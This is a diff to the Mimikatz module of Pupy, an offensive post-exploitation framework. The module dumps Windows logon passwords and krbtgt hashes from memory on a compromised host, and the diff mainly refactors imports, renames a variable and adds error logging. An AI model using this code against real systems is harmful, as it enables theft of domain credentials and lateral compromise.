@@ -1,16 +1,20 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
-from pupylib.PupyModule import *
-from pupylib.PupyCompleter import *
-from pupylib.utils.pe import get_pe_arch
-from pupylib.PupyErrors import PupyModuleError
-from pupylib.utils.rpyc_utils import redirected_stdio
+
+from pupylib.PupyModule import (
+    config, PupyArgumentParser,
+    REQUIRE_TERMINAL
+)
+
+from pupylib.PupyOutput import Error
+
 from modules.memory_exec import MemoryExec
 from modules.lib.windows.memory_exec import exec_pe
 from pupylib.utils.credentials import Credentials
+
 import os.path
-import time
+import re
 
 __class_name__="Mimikatz"
 
@@ -40,11 +44,11 @@ class Mimikatz(MemoryExec):
             '--logonPasswords', action='store_true', default=False, help='retrieve passwords from memory')
 
     def run(self, args):
-        
+
         proc_arch       = self.client.desc["proc_arch"]
         mimikatz_path   = None
         output          = ''
-        
+
         if '64' in  self.client.desc['os_arch'] and "32" in proc_arch:
             self.error("You are in a x86 process right now. You have to be in a x64 process for running Mimikatz.")
             self.error("Otherwise, the following Mimikatz error will occur after 'sekurlsa::logonPasswords':")
@@ -228,7 +232,7 @@ class Mimikatz(MemoryExec):
                         if krbtgtHash != "":
                             creds.append({
                                 'Domain': domain,
-                                'Login': user,
+                                'Login': username,
                                 'Hash': krbtgtHash,
                                 'Host': hostName,
                                 'CredType': 'hash',
@@ -237,8 +241,8 @@ class Mimikatz(MemoryExec):
                                 'uid': self.client.short_name()
                             })
 
-                    except Exception as e:
-                        pass
+                    except Exception, e:
+                        self.log(Error(e))
 
         if len(creds) == 0:
             # check if we get lsadump::dcsync output
